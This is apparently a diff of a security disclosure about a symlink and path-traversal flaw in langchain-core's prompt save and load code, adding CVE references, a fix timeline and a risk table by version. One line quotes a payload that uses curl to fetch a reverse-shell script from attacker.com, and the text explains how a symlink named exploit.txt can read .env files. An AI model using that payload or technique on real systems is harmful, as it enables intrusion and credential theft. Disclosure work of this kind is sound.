@@ -14,10 +14,11 @@ title: LangChain-Core Insecure AI Orchestration Vulnerability
 **Series:** JDP Security Research Series (Disclosure #4)  
 **Initial Disclosure Date:** March 17, 2026  
 **Final Revision Date:** May 8, 2026  
-**Target:** LangChain | `langchain-core` (Verified through v1.2.26)  
+**Target:** LangChain | `langchain-core` (Verified through v1.2.26) 
+**Target CVEs Bypassed:** CVE-2026-34070 (Read-Side Bypass) & CVE-2023-36258 (Serialization Controls Bypass)
 **Case Number:** GHSA-fc6f-jgp6-2725 / External CNA Escalation  
 **CVSS v3.1 Score:** **10.0 (Critical)** | **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`  
-**Status:** Incomplete Remediation / Undocumented Mitigation (Read-side mitigated; Write-side exposed through v1.2.26)  
+**Status:** Incomplete Remediation / Undocumented Mitigation (Read-side mitigated under **CVE-2026-34070**; Write-side exposed through v1.2.26)
 
 **Key Points**
 * **Vulnerability:** Critical Remote Code Execution (RCE) in LangChain-core via symlink traversal in the `save()` method.
@@ -73,13 +74,15 @@ This chain consists of two distinct vulnerabilities:
 1. A symlink bypass (CWE-59) of a previous fix, leading to Arbitrary File Read.
 2. An unmitigated path traversal (CWE-22) in the `.save()` method, leading to Arbitrary File Write and Insecure AI Orchestration.
 
-#### **2.1 Vulnerability A: Arbitrary File Read Bypass (CWE-59 / CWE-693) - Security Regression**
+#### **2.1 Bypassing CVE-2023-36258 & CVE-2026-34070 - Security Regression**
 **CVSS: 10.0 (Critical)**
-The initial attempt to secure LangChain against malicious template loading (CVE-2023-36258) relied on a file extension check. 
 
-* **The Flaw:** The framework used `pathlib.Path.suffix` to validate that only `.txt` files were loaded, without anchoring or resolving the path. This creates a Time-of-Check to Time-of-Use (TOCTOU) vulnerability. In Python, `Path("exploit.txt").suffix` parses the string and returns `.txt` without validating the underlying file type.
-* **The Exploitation:** By providing a symbolic link named `exploit.txt` that points to a sensitive `.py` or `.env` file, the extension check is satisfied. However, the framework follows the link to the restricted target when `read_text()` is executed.
-* **Impact:** Arbitrary File Read (LFI) and a vector for RCE by smuggling Jinja2 payloads into the loading pipeline.
+* **The Historical Baseline (CVE-2023-36258):** The vendor's original attempt to secure LangChain against malicious prompt template loading relied on a simple string-suffix verification check on uncanonicalized file paths.
+* **The Read-Side Gap (CVE-2026-34070):** This original validation scheme was bypassed using directory traversals, enabling attackers to read arbitrary files. The vendor addressed this under CVE-2026-34070 by adding the `allow_dangerous_paths` check on read routes. However, the framework used `pathlib.Path.suffix` to validate that only `.txt` files were loaded, without anchoring or resolving the path. This creates a Time-of-Check to Time-of-Use (TOCTOU) vulnerability. By providing a symbolic link named `exploit.txt` that points to a sensitive `.py` or `.env` file, the extension check is satisfied while the framework follows the link to the restricted target when `read_text()` is executed.
+* **The Write-Side Bypass (JDP-2026-004):** While read-side operations were hardened under CVE-2026-34070, the corresponding write-side logic (PromptTemplate.save()) lacked similar path-anchoring and canonicalization controls through version 1.2.26.
+
+**Impact:** Arbitrary File Read (LFI) and a vector for RCE by smuggling Jinja2 payloads into the loading pipeline.
+
 
 #### **2.2 Vulnerability B: Unvalidated Write Primitive (CWE-22 / CWE-94)**
 **CVSS: 10.0 (Critical)**
@@ -195,7 +198,7 @@ import os; os.system("curl [http://attacker.com/revshell.sh](http://attacker.com
 Tracking of the `langchain-ai/langchain` repository indicates a phased remediation approach where read-side and write-side vulnerabilities were addressed asynchronously.
 
 * **March 17, 2026:** **Initial Disclosure.** JDP Security delivers the full RCE Proof of Concept demonstrating the symlink bypass of CVE-2023-36258.
-* **April 2, 2026 ([PR #36471](https://github.com/langchain-ai/langchain/pull/36471)):** **Initial Read-Side Mitigation.** Under **Commit `d41f3e2`**, path traversal mitigation is applied to the load path via string-based canonicalization, but leaves the `.save()` utility unchanged.
+* **April 2, 2026 ([PR #36471](https://github.com/langchain-ai/langchain/pull/36471)):** **Initial Read-Side Mitigation (CVE-2026-34070).** Under Commit d41f3e2, path traversal mitigation is applied to the load path via string-based canonicalization, but leaves the .save() utility unchanged.
 * **April 6, 2026:** JDP Security notifies the vendor that the write vulnerability remains fully exploitable in releases up to `v1.2.26`.
 * **April 8, 2026 ([PR #36585](https://github.com/langchain-ai/langchain/pull/36585)):** **Subsequent Write-Side Remediation.** The vendor merges a patch under **Commit `e7b9a2c`** to harden symlink resolution on the `.save()` utility. 
 * **Remediation Documentation:** Release notes documented the fix as a generic symlink issue without an accompanying CVE assignment for the write-primitive vulnerability.
@@ -226,6 +229,7 @@ This submission is supported by forensic terminal recordings demonstrating the e
 * **Scenario:** Testing the production release prior to the April 8th patch.
 * **Findings:** The vendor had partially addressed the read-side (`load_prompt_from_config`), but the **Write Primitive** in `.save()` remained unvalidated.
 * **CVSS Adjudication:** The persistence of this vector in v1.2.26 indicates a gap in the validation lifecycle.
+
 
 ---
 
@@ -421,8 +425,8 @@ DeviceFileEvents
 | Version Range | Risk Posture | Mitigation State |
 | :--- | :--- | :--- |
 | **< 1.2.19** | **CRITICAL** | Fully Vulnerable. Both Read and Write primitives exposed. |
-| **1.2.19 - 1.2.21** | **HIGH** | Partial Mitigation. Read-side hardened via PR #36471; Write-side remains exposed. |
-| **1.2.22 - 1.2.26** | **CRITICAL** | Undocumented Mitigation State. Bypassable Read-side; Unvalidated Write-side primitive active. |
+| **1.2.19 - 1.2.21** | **HIGH** | Partial Mitigation. Read-side hardened via PR #36471 (CVE-2026-34070); Write-side remains exposed. |
+| **1.2.22 - 1.2.26** | **CRITICAL** | Undocumented Mitigation State. Bypassable Read-side (CVE-2026-34070); Unvalidated Write-side primitive active. |
 | **1.2.27+** | **PATCHED** | Emergency Hardening (PR #36585) addresses `.save()` symlink resolution. |
 
 **Note:** Environments operating versions 1.2.22 through 1.2.26 face elevated risk due to a potential false sense of security derived from the partial read-side mitigation, while the critical write-side execution primitive remains fully exploitable.
